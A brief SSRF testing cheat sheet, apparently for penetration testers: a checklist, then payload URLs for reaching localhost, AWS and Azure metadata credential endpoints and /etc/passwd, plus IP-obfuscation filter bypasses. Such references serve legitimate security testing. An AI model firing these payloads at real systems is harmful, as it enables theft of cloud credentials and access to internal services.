# SSRF

**Quick Checklist**
- [ ] URL parameter exists?
- [ ] Can reach localhost?
- [ ] Can reach cloud metadata?
- [ ] Blind (OOB) possible?

**Basic Tests**
```bash
http://127.0.0.1/
http://localhost/
http://169.254.169.254/latest/meta-data/
file:///etc/passwd
```

**Cloud Metadata**
```bash
# AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Azure
http://169.254.169.254/metadata/identity/oauth2/token
```

**Bypasses**
```bash
http://127.1/
http://0x7f.0x0.0x0.0x1/
http://[::1]/
http://127.0.0.1.nip.io/
```
